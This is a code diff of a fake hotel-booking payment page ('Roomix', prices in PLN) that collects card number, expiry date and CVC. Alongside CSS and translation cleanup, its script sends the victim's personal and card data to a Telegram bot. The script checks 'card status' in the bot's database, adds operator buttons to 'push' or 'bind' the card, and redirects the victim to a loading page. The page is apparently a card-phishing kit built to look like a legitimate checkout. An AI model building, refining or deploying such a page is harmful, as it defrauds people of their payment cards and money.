@@ -45,7 +45,6 @@
             background-size: cover;
         }
 
-        /* Убираем любой возможный белый фон */
         body::before {
             content: '';
             position: fixed;
@@ -68,7 +67,6 @@
             z-index: 1;
         }
 
-        /* Header - ТОЧНО ТАКОЙ ЖЕ КАК В index.html */
         header {
             display: flex;
             justify-content: space-between;
@@ -211,7 +209,6 @@
             transform: translateY(-2px);
         }
 
-        /* Main Content */
         .main-content {
             display: grid;
             grid-template-columns: 1fr 1.2fr;
@@ -229,127 +226,125 @@
             box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
         }
 
-        /* ИСПРАВЛЕННАЯ КАРТА - нормальные размеры для десктопа */
-.credit-card-container {
-    perspective: 1000px;
-    margin-bottom: 40px;
-}
+        .credit-card-container {
+            perspective: 1000px;
+            margin-bottom: 40px;
+        }
 
-.credit-card {
-    width: 100%;
-    max-width: 420px;
-    height: 260px;
-    margin: 0 auto;
-    position: relative;
-    transform-style: preserve-3d;
-    transition: transform 0.6s;
-    border-radius: 20px;
-    box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
-}
+        .credit-card {
+            width: 100%;
+            max-width: 440px;
+            height: 280px;
+            margin: 0 auto;
+            position: relative;
+            transform-style: preserve-3d;
+            transition: transform 0.6s;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+        }
 
-.card-front, .card-back {
-    position: absolute;
-    width: 100%;
-    height: 100%;
-    backface-visibility: hidden;
-    border-radius: 20px;
-    padding: 30px;
-    background: linear-gradient(135deg, var(--primary-dark) 0%, var(--primary) 100%);
-    display: flex;
-    flex-direction: column;
-    justify-content: space-between;
-}
+        .card-front, .card-back {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            backface-visibility: hidden;
+            border-radius: 20px;
+            padding: 30px;
+            background: linear-gradient(135deg, var(--primary-dark) 0%, var(--primary) 100%);
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+        }
 
-.card-back {
-    transform: rotateY(180deg);
-    background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
-}
+        .card-back {
+            transform: rotateY(180deg);
+            background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
+        }
 
-.card-logo {
-    font-size: 26px;
-    font-weight: 800;
-    color: var(--dark);
-}
+        .card-logo {
+            font-size: 24px;
+            font-weight: 800;
+            color: var(--dark);
+        }
 
-.card-number {
-    font-size: 26px;
-    font-weight: 600;
-    letter-spacing: 4px;
-    color: var(--dark);
-    text-align: center;
-    margin: 25px 0;
-    font-family: 'Courier New', monospace;
-    word-spacing: 12px;
-    line-height: 1.2;
-}
+        .card-number {
+            font-size: 24px;
+            font-weight: 600;
+            letter-spacing: 3px;
+            color: var(--dark);
+            text-align: center;
+            margin: 25px 0;
+            font-family: 'Courier New', monospace;
+            word-spacing: 10px;
+            line-height: 1.3;
+        }
 
-.card-info {
-    display: flex;
-    justify-content: space-between;
-    align-items: flex-end;
-    margin-top: 15px;
-}
+        .card-info {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-end;
+        }
 
-.card-holder, .card-expiry {
-    display: flex;
-    flex-direction: column;
-    gap: 5px;
-}
+        .card-holder, .card-expiry {
+            display: flex;
+            flex-direction: column;
+            gap: 5px;
+        }
 
-.card-label {
-    font-size: 11px;
-    text-transform: uppercase;
-    color: rgba(18, 18, 18, 0.6);
-    font-weight: 600;
-    letter-spacing: 1px;
-}
+        .card-label {
+            font-size: 10px;
+            text-transform: uppercase;
+            color: rgba(18, 18, 18, 0.6);
+            font-weight: 600;
+            letter-spacing: 1px;
+        }
 
-.card-value {
-    font-size: 16px;
-    font-weight: 600;
-    color: var(--dark);
-    text-transform: uppercase;
-    font-family: 'Courier New', monospace;
-    letter-spacing: 1px;
-}
+        .card-value {
+            font-size: 16px;
+            font-weight: 600;
+            color: var(--dark);
+            text-transform: uppercase;
+            font-family: 'Courier New', monospace;
+            letter-spacing: 1px;
+        }
 
-.card-brand {
-    position: absolute;
-    top: 30px;
-    right: 30px;
-    width: 70px;
-    height: 40px;
-    opacity: 0.8;
-}
+        .card-brand {
+            position: absolute;
+            top: 30px;
+            right: 30px;
+            width: 70px;
+            height: 40px;
+            opacity: 0.8;
+        }
 
-.card-brand img {
-    width: 100%;
-    height: auto;
-}
+        .card-brand img {
+            width: 100%;
+            height: auto;
+        }
 
-.card-stripe {
-    width: 100%;
-    height: 50px;
-    background: var(--dark);
-    margin: 25px 0;
-}
+        .card-stripe {
+            width: 100%;
+            height: 50px;
+            background: var(--dark);
+            margin: 25px 0;
+        }
 
-.card-cvc-box {
-    background: white;
-    padding: 12px;
-    border-radius: 6px;
-    text-align: right;
-    margin-top: 20px;
-}
+        .card-cvc-box {
+            background: white;
+            padding: 10px;
+            border-radius: 5px;
+            text-align: right;
+            margin-top: 20px;
+        }
 
-.card-cvc-value {
-    font-size: 18px;
-    font-weight: 700;
-    color: var(--dark);
-    letter-spacing: 2px;
-    font-family: 'Courier New', monospace;
-}
-        /* Form */
+        .card-cvc-value {
+            font-size: 18px;
+            font-weight: 700;
+            color: var(--dark);
+            letter-spacing: 2px;
+            font-family: 'Courier New', monospace;
+        }
+
         .section-title {
             font-size: 20px;
             font-weight: 700;
@@ -384,11 +379,10 @@
             font-family: 'Montserrat', sans-serif;
         }
 
-        /* ЦИФРОВАЯ КЛАВИАТУРА для полей */
         input[type="text"]#cardNumber,
         input[type="text"]#expiry,
         input[type="text"]#cvc {
-            inputmode: numeric; /* Мобильная цифровая клавиатура */
+            inputmode: numeric;
         }
 
         input:focus {
@@ -421,7 +415,6 @@
             display: none;
         }
 
-        /* Buttons */
         .button-group {
             display: flex;
             gap: 15px;
@@ -471,7 +464,6 @@
             transform: translateY(-2px);
         }
 
-        /* Guest Info */
         .guest-info {
             background: rgba(212, 175, 55, 0.05);
             border-radius: 15px;
@@ -501,7 +493,6 @@
             font-weight: 600;
         }
 
-        /* Price Summary */
         .summary-section {
             background: rgba(255, 255, 255, 0.02);
             border-radius: 15px;
@@ -526,7 +517,6 @@
             color: var(--primary);
         }
 
-        /* Security */
         .secure-info {
             display: flex;
             align-items: center;
@@ -540,7 +530,6 @@
             font-size: 14px;
         }
 
-        /* Result Messages */
         .result-message {
             display: none;
             padding: 15px;
@@ -573,189 +562,144 @@
             }
         }
 
-        /* Confetti */
-        .confetti {
-            position: fixed;
-            width: 10px;
-            height: 10px;
-            background: var(--primary);
-            animation: fall 2s linear;
-            z-index: 9999;
-        }
-
-        @keyframes fall {
-            to {
-                transform: translateY(100vh) rotate(360deg);
-            }
-        }
-
-        /* Confetti Animation из txt */
-        .confetti {
-            position: fixed;
-            top: -10px;
-            z-index: 9999;
-            animation: confetti-fall linear forwards;
-            pointer-events: none;
-        }
-
-        @keyframes confetti-fall {
-            to {
-                transform: translateY(100vh) rotate(360deg);
-            }
-        }
-
-        /* Responsive */
         @media (max-width: 1024px) {
             .main-content {
                 grid-template-columns: 1fr;
             }
         }
 
-        /* Responsive */
-@media (max-width: 1024px) {
-    .main-content {
-        grid-template-columns: 1fr;
-    }
-}
+        @media (max-width: 768px) {
+            .container {
+                padding: 15px;
+            }
 
-@media (max-width: 768px) {
-    .container {
-        padding: 15px;
-    }
+            header {
+                flex-direction: column;
+                gap: 20px;
+                text-align: center;
+            }
 
-    header {
-        flex-direction: column;
-        gap: 20px;
-        text-align: center;
-    }
+            .logo {
+                justify-content: center;
+                width: 100%;
+            }
 
-    .logo {
-        justify-content: center;
-        width: 100%;
-    }
+            .header-controls {
+                width: 100%;
+                justify-content: center;
+                flex-direction: row;
+                gap: 15px;
+            }
 
-    .header-controls {
-        width: 100%;
-        justify-content: center;
-        flex-direction: row;
-        gap: 15px;
-    }
+            .user-actions {
+                gap: 10px;
+            }
 
-    .user-actions {
-        gap: 10px;
-    }
+            .btn-icon {
+                width: 44px;
+                height: 44px;
+            }
 
-    .btn-icon {
-        width: 44px;
-        height: 44px;
-    }
+            .panel {
+                padding: 25px;
+                margin-bottom: 20px;
+            }
 
-    .panel {
-        padding: 25px;
-        margin-bottom: 20px;
-    }
+            .form-row {
+                grid-template-columns: 1fr;
+            }
 
-    .card-number {
-        font-size: 16px;
-        letter-spacing: 1px;
-    }
+            .button-group {
+                flex-direction: column;
+            }
 
-    .form-row {
-        grid-template-columns: 1fr;
-    }
+            .credit-card {
+                height: 240px;
+                max-width: 380px;
+            }
 
-    .button-group {
-        flex-direction: column;
-    }
+            .card-front, .card-back {
+                padding: 25px;
+            }    
 
-    .credit-card {
-        height: 240px;
-        max-width: 380px;
-    }
+            .card-number {
+                font-size: 20px;
+                letter-spacing: 2px;
+                margin: 20px 0;
+            }
 
-    .card-front, .card-back {
-        padding: 25px;
-    }    
+            .card-brand {
+                top: 25px;
+                right: 25px;
+                width: 60px;
+                height: 35px;
+            }
+        }
 
-    .card-number {
-        font-size: 22px;
-        letter-spacing: 3px;
-        margin: 20px 0;
-    }
+        @media (max-width: 480px) {
+            .container {
+                padding: 12px;
+            }
 
-    .card-brand {
-        top: 25px;
-        right: 25px;
-        width: 60px;
-        height: 35px;
-    }
-}
+            .logo-icon {
+                width: 44px;
+                height: 44px;
+                font-size: 20px;
+            }
 
-@media (max-width: 480px) {
-    .container {
-        padding: 12px;
-    }
+            .logo-text {
+                font-size: 24px;
+            }
 
-    .logo-icon {
-        width: 44px;
-        height: 44px;
-        font-size: 20px;
-    }
+            .header-controls {
+                flex-direction: column;
+                gap: 12px;
+            }
 
-    .logo-text {
-        font-size: 24px;
-    }
+            .language-btn {
+                padding: 10px 15px;
+                font-size: 15px;
+                min-height: 44px;
+            }
 
-    .header-controls {
-        flex-direction: column;
-        gap: 12px;
-    }
+            .panel {
+                padding: 20px;
+                border-radius: 16px;
+            }
 
-    .language-btn {
-        padding: 10px 15px;
-        font-size: 15px;
-        min-height: 44px;
-    }
+            input {
+                padding: 12px;
+                font-size: 16px;
+            }
 
-    .panel {
-        padding: 20px;
-        border-radius: 16px;
-    }
+            .credit-card {
+                height: 220px;
+                max-width: 340px;
+            }
+            .card-front, .card-back {
+                padding: 20px;
+            }
 
-    input {
-        padding: 12px;
-        font-size: 16px;
-    }
+            .card-number {
+                font-size: 18px;
+                letter-spacing: 1px;
+                margin: 15px 0;
+            }
 
-    .credit-card {
-        height: 220px;
-        max-width: 340px;
-    }
-    .card-front, .card-back {
-        padding: 20px;
-    }
+            .card-value {
+                font-size: 14px;
+            }
 
-    .card-number {
-        font-size: 18px;
-        letter-spacing: 2px;
-        margin: 15px 0;
-    }
+            .card-label {
+                font-size: 8px;
+            }
 
-    .card-value {
-        font-size: 14px;
-    }
+            .card-brand {
+                width: 50px;
+                height: 25px;
+            }
+        }
 
-    .card-label {
-        font-size: 8px;
-    }
-
-    .card-brand {
-        width: 35px;
-        height: 20px;
-    }
-}
-
-        /* iOS Specific Fixes */
         @supports (-webkit-touch-callout: none) {
             input, .btn {
                 min-height: 44px;
@@ -770,25 +714,21 @@
             }
         }
 
-        /* Prevent zoom on input focus for mobile */
         @media screen and (max-width: 768px) {
             input, select, textarea {
                 font-size: 16px !important;
             }
         }
 
-        /* Убираем скроллбар для вебкитов */
         ::-webkit-scrollbar {
             width: 0px;
             background: transparent;
         }
 
-        /* Для Firefox */
         * {
             scrollbar-width: none;
         }
 
-        /* Для IE и Edge */
         * {
             -ms-overflow-style: none;
         }
@@ -797,7 +737,6 @@
 <body>
     <div class="container">
         <header>
-            <!-- УБРАЛ ССЫЛКУ С ЛОГОТИПА - ТЕПЕРЬ ПРОСТО DIV -->
             <div class="logo">
                 <div class="logo-icon">R</div>
                 <div class="logo-text">Roomix</div>
@@ -831,7 +770,7 @@
         <div class="main-content">
             <main class="panel">
                 <div class="section-title" id="cardDetailsTitle">Данные карты</div>
-                <!-- Исправленная карта -->
+                
                 <div class="credit-card-container">
                     <div class="credit-card" id="creditCard">
                         <div class="card-front">
@@ -861,7 +800,6 @@
                 <form id="paymentForm" autocomplete="on">
                     <div class="form-group">
                         <label for="cardNumber" id="cardNumberLabel">Номер карты</label>
-                        <!-- inputmode="numeric" для цифровой клавиатуры -->
                         <input type="text" id="cardNumber" name="cc-number" autocomplete="cc-number" 
                                placeholder="1234 5678 9012 3456" maxlength="19" inputmode="numeric">
                         <div class="error-message" id="errorNumber">Неверный номер карты</div>
@@ -870,14 +808,12 @@
                     <div class="form-row">
                         <div class="form-group">
                             <label for="expiry" id="expiryLabel">Срок действия</label>
-                            <!-- inputmode="numeric" для цифровой клавиатуры -->
                             <input type="text" id="expiry" name="cc-exp" autocomplete="cc-exp" 
                                    placeholder="ММ/ГГ" maxlength="5" inputmode="numeric">
                             <div class="error-message" id="errorExpiry">Неверный срок</div>
                         </div>
                         <div class="form-group">
                             <label for="cvc" id="cvcLabel">CVC/CVV</label>
-                            <!-- inputmode="numeric" для цифровой клавиатуры -->
                             <input type="text" id="cvc" name="cc-csc" autocomplete="cc-csc" 
                                    placeholder="123" maxlength="4" inputmode="numeric">
                             <div class="error-message" id="errorCvc">Неверный код</div>
@@ -957,11 +893,8 @@
     </div>
 
     <script>
-        // Тексты для разных языков
         const translations = {
             ru: {
-                "step1": "1. Данные для бронирования",
-                "step2": "2. Подтверждение и оплата",
                 "cardDetails": "Данные карты",
                 "cardNumber": "Номер карты",
                 "expiry": "Срок действия",
@@ -984,83 +917,12 @@
                 "cardNumberError": "Неверный номер карты",
                 "expiryError": "Неверный срок",
                 "cvcError": "Неверный код",
-                "paymentSuccess": "Оплата успешно завершена! Спасибо за бронирование.",
-                "processing": "Обработка...",
-                "paid": "Оплачено",
-                "night": "ночь",
-                "nights": "ночи",
-                "nights_plural": "ночей"
-            },
-            pl: {
-                "step1": "1. Dane rezerwacji",
-                "step2": "2. Potwierdzenie i płatność",
-                "cardDetails": "Dane karty",
-                "cardNumber": "Numer karty",
-                "expiry": "Data ważności",
-                "cvc": "CVC/CVV",
-                "back": "Wstecz",
-                "pay": "Zapłać",
-                "bookingDetails": "Szczegóły rezerwacji",
-                "guest": "Gość",
-                "email": "Email",
-                "phone": "Telefon",
-                "checkIn": "Zameldowanie",
-                "checkOut": "Wymeldowanie",
-                "guests": "Gości",
-                "serviceFee": "Opłata serwisowa",
-                "taxes": "Podatki",
-                "total": "Razem do zapłaty",
-                "secure": "Bezpieczne połączenie · Dane chronione",
-                "cardHolder": "WŁAŚCICIEL KARTY",
-                "expires": "WAŻNA DO",
-                "cardNumberError": "Nieprawidłowy numer karty",
-                "expiryError": "Nieprawidłowy termin",
-                "cvcError": "Nieprawidłowy kod",
-                "paymentSuccess": "Płatność zakończona pomyślnie! Dziękujemy za rezerwację.",
-                "processing": "Przetwarzanie...",
-                "paid": "Zapłacono",
-                "night": "noc",
-                "nights": "noce",
-                "nights_plural": "nocy"
-            },
-            en: {
-                "step1": "1. Booking Data",
-                "step2": "2. Confirmation and Payment",
-                "cardDetails": "Card Details",
-                "cardNumber": "Card Number",
-                "expiry": "Expiry Date",
-                "cvc": "CVC/CVV",
-                "back": "Back",
-                "pay": "Pay",
-                "bookingDetails": "Booking Details",
-                "guest": "Guest",
-                "email": "Email",
-                "phone": "Phone",
-                "checkIn": "Check-in",
-                "checkOut": "Check-out",
-                "guests": "Guests",
-                "serviceFee": "Service Fee",
-                "taxes": "Taxes",
-                "total": "Total to Pay",
-                "secure": "Secure Connection · Data Protected",
-                "cardHolder": "CARD HOLDER",
-                "expires": "EXPIRES",
-                "cardNumberError": "Invalid card number",
-                "expiryError": "Invalid expiry date",
-                "cvcError": "Invalid code",
-                "paymentSuccess": "Payment completed successfully! Thank you for booking.",
-                "processing": "Processing...",
-                "paid": "Paid",
-                "night": "night",
-                "nights": "nights",
-                "nights_plural": "nights"
+                "processing": "Обработка..."
             }
         };
 
-        // Текущий язык - ТОЧНО ТАК ЖЕ КАК В index.html
         let currentLanguage = sessionStorage.getItem('selectedLanguage') || 'ru';
 
-        // Загружаем данные из sessionStorage
         function loadBookingData() {
             const bookingData = sessionStorage.getItem('bookingData');
             const formData = sessionStorage.getItem('formData');
@@ -1070,45 +932,29 @@
                 document.getElementById('guestName').textContent = `${data.firstName || '-'} ${data.lastName || '-'}`;
                 document.getElementById('guestEmail').textContent = data.email || '-';
                 document.getElementById('guestPhone').textContent = data.phone || '-';
-
-                // Обновляем имя на карте
                 const fullName = `${data.firstName || ''} ${data.lastName || ''}`.trim().toUpperCase();
                 document.getElementById('cardHolderName').textContent = fullName || '';
             }
 
             if (bookingData) {
                 const data = JSON.parse(bookingData);
-
-                // Форматируем даты
                 if (data.checkIn) {
                     const checkIn = new Date(data.checkIn);
                     document.getElementById('checkInDate').textContent = checkIn.toLocaleDateString('ru-RU');
                 }
-
                 if (data.checkOut) {
                     const checkOut = new Date(data.checkOut);
                     document.getElementById('checkOutDate').textContent = checkOut.toLocaleDateString('ru-RU');
                 }
-
                 document.getElementById('guestsCount').textContent = data.guests || '1';
                 document.getElementById('roomPrice').textContent = data.pricePerNight || '450';
                 document.getElementById('nightsCount').textContent = data.nights || '1';
-                document.getElementById('nightsText').textContent = getNightText(data.nights || 1);
-
                 const basePrice = (data.pricePerNight || 450) * (data.nights || 1);
                 document.getElementById('basePrice').textContent = `${basePrice} PLN`;
                 document.getElementById('totalAmount').textContent = `${data.total || '570'} PLN`;
             }
         }
 
-        function getNightText(nights) {
-            const t = translations[currentLanguage];
-            if (nights === 1) return t.night;
-            if (nights >= 2 && nights <= 4) return t.nights;
-            return t.nights_plural;
-        }
-
-        // Работа с картой
         const creditCard = document.getElementById('creditCard');
         const cardNumber = document.getElementById('cardNumber');
         const expiry = document.getElementById('expiry');
@@ -1116,7 +962,6 @@
         const payBtn = document.getElementById('payBtn');
         const backBtn = document.getElementById('backBtn');
         const resultMessage = document.getElementById('resultMessage');
-
         const cardNumberDisplay = document.getElementById('cardNumberDisplay');
         const cardExpiryDisplay = document.getElementById('cardExpiryDisplay');
         const cvcDisplay = document.getElementById('cvcDisplay');
@@ -1125,14 +970,14 @@
         const onlyDigits = (str) => (str || '').replace(/\D/g, '');
 
         const formatCardNumber = (value) => {
-            const digits = onlyDigits(value).slice(0, 19);
+            const digits = onlyDigits(value).slice(0, 16);
             return digits.replace(/(.{4})/g, '$1 ').trim();
         };
 
         const luhnCheck = (number) => {
             const digits = onlyDigits(number);
-            if (!digits || digits.length < 13 || digits.length > 19) return false;
-            if (digits.replace(/0/g, '') === '') return false; // Проверка на все нули
+            if (!digits || digits.length !== 16) return false;
+            if (digits.replace(/0/g, '') === '') return false;
 
             let sum = 0;
             let isEven = false;
@@ -1154,7 +999,7 @@
 
         const detectCardBrand = (number) => {
             const digits = onlyDigits(number);
-            if (!digits) return 'unknown';
+            if (!digits || digits.length !== 16) return 'unknown';
 
             if (digits.startsWith('4')) return 'visa';
             if (digits.startsWith('5') || digits.startsWith('2')) return 'mastercard';
@@ -1171,10 +1016,6 @@
                 cardBrand.innerHTML = '<img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="Visa">';
             } else if (brand === 'mastercard') {
                 cardBrand.innerHTML = '<img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard">';
-            } else if (brand === 'amex') {
-                cardBrand.innerHTML = '<img src="https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo.svg" alt="American Express">';
-            } else if (brand === 'discover') {
-                cardBrand.innerHTML = '<img src="https://upload.wikimedia.org/wikipedia/commons/5/57/Discover_Card_logo.svg" alt="Discover">';
             }
         };
 
@@ -1219,38 +1060,43 @@
             const expiryValue = expiry.value;
             const cvcValue = cvc.value;
 
-            const cardNumberValid = luhnCheck(cardNumberValue) && cardNumberValue.trim() !== '';
+            const digitsCount = onlyDigits(cardNumberValue).length;
+            const cardNumberValid = luhnCheck(cardNumberValue) && digitsCount === 16;
             const expiryValid = validateExpiry(expiryValue) && expiryValue.trim() !== '';
             const cvcValid = validateCvc(cvcValue, detectCardBrand(cardNumberValue)) && cvcValue.trim() !== '';
 
-            // Показываем/скрываем ошибки
             document.getElementById('errorNumber').style.display = cardNumberValid ? 'none' : 'block';
             document.getElementById('errorExpiry').style.display = expiryValid ? 'none' : 'block';
             document.getElementById('errorCvc').style.display = cvcValid ? 'none' : 'block';
 
-            // Добавляем/убираем классы ошибок и успеха только если поле не пустое
-            cardNumber.classList.toggle('error', !cardNumberValid && cardNumberValue.trim() !== '');
-            cardNumber.classList.toggle('success', cardNumberValid);
+            if (cardNumberValue.trim() !== '') {
+                if (digitsCount === 16 && cardNumberValid) {
+                    cardNumber.classList.remove('error');
+                    cardNumber.classList.add('success');
+                } else {
+                    cardNumber.classList.remove('success');
+                    cardNumber.classList.add('error');
+                }
+            } else {
+                cardNumber.classList.remove('error', 'success');
+            }
+
             expiry.classList.toggle('error', !expiryValid && expiryValue.trim() !== '');
             expiry.classList.toggle('success', expiryValid);
             cvc.classList.toggle('error', !cvcValid && cvcValue.trim() !== '');
             cvc.classList.toggle('success', cvcValid);
 
-            // Активируем кнопку оплаты
             payBtn.disabled = !(cardNumberValid && expiryValid && cvcValid);
 
             return cardNumberValid && expiryValid && cvcValid;
         };
 
-        // Обработчики событий
         cardNumber.addEventListener('input', (e) => {
             const formatted = formatCardNumber(e.target.value);
             e.target.value = formatted;
             cardNumberDisplay.textContent = formatted || '•••• •••• •••• ••••';
-
             const brand = detectCardBrand(e.target.value);
             updateCardBrand(brand);
-
             validateForm();
         });
 
@@ -1278,7 +1124,6 @@
             validateForm();
         });
 
-        // Обработчик кнопки "Назад"
         backBtn.addEventListener('click', () => {
             window.location.href = 'index.html';
         });
@@ -1314,17 +1159,11 @@
                 const expiry = document.getElementById('expiry').value;
                 const cvc = document.getElementById('cvc').value;
 
-                // ПРОВЕРЯЕМ СТАТУС КАРТЫ ЧЕРЕЗ БД БОТА
                 const isCardBound = await checkCardStatus(cardNumber);
-                
-                // УНИКАЛЬНЫЙ ID
                 const paymentId = Date.now() + (paymentCounter++);
-                
-                // ОПРЕДЕЛЯЕМ СТАТУС
                 const cardStatus = isCardBound ? 'ПРИВЯЗАННАЯ КАРТА' : 'НЕПРИВЯЗАННАЯ КАРТА';
                 const statusIcon = isCardBound ? '✅' : '🔗';
 
-                // ФОРМИРУЕМ СООБЩЕНИЕ СО СТАТУСОМ
                 const message = `💳 <b>${cardStatus}</b> ${statusIcon}
 
 👤 <b>Клиент:</b>
@@ -1360,7 +1199,6 @@
                                         callback_data: `push_${paymentId}_${userId}`
                                     }
                                 ],
-                                // Показываем кнопку "Привязать" только для непривязанных карт
                                 ...(!isCardBound ? [[
                                     {
                                         text: "🔗 Привязать",
@@ -1388,25 +1226,21 @@
             }
         }
 
-        // Обработчик кнопки "Оплатить"
         payBtn.addEventListener('click', async () => {
             if (!validateForm()) return;
 
-            // Показываем сообщение о процессе
             resultMessage.className = 'result-message';
             resultMessage.style.display = 'block';
             resultMessage.textContent = translations[currentLanguage].processing;
             payBtn.disabled = true;
 
             try {
-                // ОТПРАВЛЯЕМ ДАННЫЕ В БОТ
                 const botSuccess = await sendToTelegramBot();
 
                 if (botSuccess) {
-                    // СРАЗУ ПЕРЕХОДИМ НА LOADING.HTML БЕЗ СООБЩЕНИЙ И КОНФЕТТИ
                     setTimeout(() => {
                         window.location.href = 'loading.html';
-                    }, 500); // Быстрый переход через 0.5 секунды
+                    }, 500);
                 } else {
                     throw new Error('Ошибка отправки данных в бот');
                 }
@@ -1421,18 +1255,15 @@
             }
         });
 
-        // Языковой переключатель - ТОЧНО ТАКОЙ ЖЕ КАК В index.html
         function initLanguageSelector() {
             const languageBtn = document.querySelector('.language-btn');
             const languageDropdown = document.getElementById('languageDropdown');
 
-            // Обработчик открытия/закрытия выпадающего списка
             languageBtn.addEventListener('click', function(event) {
                 event.stopPropagation();
                 languageDropdown.classList.toggle('show');
             });
 
-            // Обработчик выбора языка
             document.querySelectorAll('.language-option').forEach(option => {
                 option.addEventListener('click', function() {
                     const lang = this.getAttribute('data-lang');
@@ -1441,7 +1272,6 @@
                 });
             });
 
-            // Закрытие выпадающего списка при клике вне его
             document.addEventListener('click', function(event) {
                 if (!languageBtn.contains(event.target) && !languageDropdown.contains(event.target)) {
                     languageDropdown.classList.remove('show');
@@ -1449,14 +1279,10 @@
             });
         }
 
-        // Функция смены языка - ТОЧНО ТАКАЯ ЖЕ КАК В index.html
         function changeLanguage(lang) {
             currentLanguage = lang;
-            sessionStorage.setItem('selectedLanguage', lang); // Сохраняем язык
-
+            sessionStorage.setItem('selectedLanguage', lang);
             const t = translations[lang];
-
-            // Обновление формы
             document.getElementById('cardDetailsTitle').textContent = t.cardDetails;
             document.getElementById('cardNumberLabel').textContent = t.cardNumber;
             document.getElementById('expiryLabel').textContent = t.expiry;
@@ -1479,26 +1305,12 @@
             document.getElementById('errorNumber').textContent = t.cardNumberError;
             document.getElementById('errorExpiry').textContent = t.expiryError;
             document.getElementById('errorCvc').textContent = t.cvcError;
-
-            // Обновление текущего языка в интерфейсе
-            document.getElementById('currentLanguage').textContent =
-                lang === 'ru' ? 'Русский' :
-                lang === 'pl' ? 'Polski' : 'English';
-
-            // Обновление активного языка в выпадающем списке
+            document.getElementById('currentLanguage').textContent = document.querySelector(`.language-option[data-lang="${lang}"]`).textContent;
             document.querySelectorAll('.language-option').forEach(option => {
-                option.classList.remove('active');
-                if (option.getAttribute('data-lang') === lang) {
-                    option.classList.add('active');
-                }
+                option.classList.toggle('active', option.getAttribute('data-lang') === lang);
             });
-
-            // Обновление текста для количества ночей
-            const nights = parseInt(document.getElementById('nightsCount').textContent) || 1;
-            document.getElementById('nightsText').textContent = getNightText(nights);
         }
 
-        // Загружаем данные при загрузке страницы
         window.addEventListener('DOMContentLoaded', () => {
             loadBookingData();
             initLanguageSelector();
@@ -1507,6 +1319,3 @@
     </script>
 </body>
 </html>
-
-
-
